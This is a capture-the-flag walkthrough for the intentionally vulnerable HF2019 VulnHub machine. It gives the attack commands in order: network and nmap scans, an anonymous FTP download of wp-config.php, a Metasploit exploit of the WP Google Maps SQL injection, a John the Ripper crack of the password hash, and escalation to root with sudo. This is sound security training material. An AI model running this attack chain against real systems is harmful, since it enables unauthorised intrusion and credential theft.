HF2019 VulnHub Walkthrough

HF2019 is a beginner-to-intermediate level vulnerable machine available on VulnHub. Download the .ova file from:
https://download.vulnhub.com/hackerfest/HF2019-Linux.ova
mport it into VirtualBox or another virtualization tool and start the machine. The goal is to capture both user and root flags.

Step 1: Identify Target IP

Scan the network for active devices:
-> sudo arp-scan -l

Look for MAC addresses starting with 08:00:27 (VirtualBox). The target IP is 10.0.2.5.

Step 2: Nmap Scan

Perform a service and version scan:
-> nmap -sC -sV -Pn -T4 10.0.2.5

Scan Results:

Open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 10000 (Webmin)

FTP allows anonymous login

HTTP runs WordPress 5.2.3

Webmin is running on port 10000

Step 3: FTP Access

Connect to FTP:
-> ftp 10.0.2.5

Login anonymously, list files, and download wp-config.php:
-> get wp-config.php

Check the contents for WordPress database credentials.

Step 4: Explore WordPress Site

Open http://10.0.2.5 in a browser. Enumerate plugins, themes, and vulnerabilities:
-> wpscan --url http://10.0.2.5/
WPScan Results:

Theme: Twenty Seventeen

Vulnerable plugin: wp-google-maps

Step 5: Exploit WP Google Maps SQL Injection

Launch Metasploit:
-> msfconsole -q

Search and use the exploit module:
-> search wp-google-maps
-> use 0
-> options
-> set rhosts 10.0.2.5
-> run

The exploit reveals a user webmaster with a hashed password.

Step 6: Crack Password

Save the hash in a file:
-> nano webmaster

Crack it with John the Ripper using rockyou.txt:
-> john --wordlist=/usr/share/wordlists/rockyou.txt webmaster

Password found: kittykat1

Step 7: SSH Login

Login as webmaster:
-> ssh webmaster@10.0.2.5

List files in home and read user flag:
-> cat ~/flag.txt

Step 8: Privilege Escalation

Check sudo privileges:
-> sudo -l

User has full sudo rights. Switch to root:
-> sudo su

Step 9: Capture Root Flag

Navigate to root and read flag:
-> cd /root
-> cat flag.txt

Summary:

Gained initial access via anonymous FTP.

Enumerated WordPress and found a vulnerable plugin.

Extracted a password hash with Metasploit and cracked it.

SSH login as webmaster revealed the user flag.

Full sudo privileges allowed easy root access and the root flag.
